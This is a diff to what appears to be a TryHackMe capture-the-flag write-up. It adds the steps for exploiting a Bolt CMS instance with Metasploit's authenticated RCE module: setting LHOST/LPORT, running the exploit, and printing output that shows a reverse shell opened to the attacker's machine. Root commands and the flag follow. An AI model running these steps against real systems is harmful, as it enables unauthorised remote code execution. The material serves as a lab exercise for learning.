@@ -277,6 +277,9 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 
 msf6 >
 ```
+
+# Vulnerability Exploitation
+> Vulnerability Exploitation Using Metasploit
 16. `use {EXPLOIT PATH}`
 17. `show options`
 ```bash
@@ -339,6 +342,7 @@ msf6 exploit(unix/webapp/bolt_authenticated_rce) >
 21. `set LHOST {MACHINE IP}`
 22. `set LPORT {PORT NUMBER}`
 23. `show options`
+24. `exploit`
 ```bash
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD boltadmin123
 PASSWORD => boltadmin123
@@ -407,6 +411,37 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 msf6 exploit(unix/webapp/bolt_authenticated_rce) > 
+```
+```bash
+msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
+
+[*] Started reverse TCP handler on 10.10.227.231:9999 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "hhrrsy".
+[*] Found 2 potential token(s) for creating .php files.
+[+] Deleted file mjuaewpru.php.
+[+] Used token cb01515d6b82cdfef71835f1ab to create wvvkcehx.php.
+[*] Attempting to execute the payload via "/files/wvvkcehx.php?hhrrsy=`payload`"
+[!] No response, may have executed a blocking payload!
+[*] Command shell session 2 opened (10.10.227.231:9999 -> 10.10.195.64:57614) at 2023-06-30 02:35:24 +0100
+[+] Deleted file wvvkcehx.php.
+[+] Reverted user profile back to original state.
+
+```
+25. `whoami`
+26. `find / -type f -name flag.txt 2>/dev/null`
+27. `cat {FLAG TEXT PATH}`
+```bash
+whoami
+root
+```
+```bash
+find / -type f -name flag.txt 2>/dev/null
+/home/flag.txt
+```
+```bash
+cat /home/flag.txt
+THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
 ```
 
 # Contributions
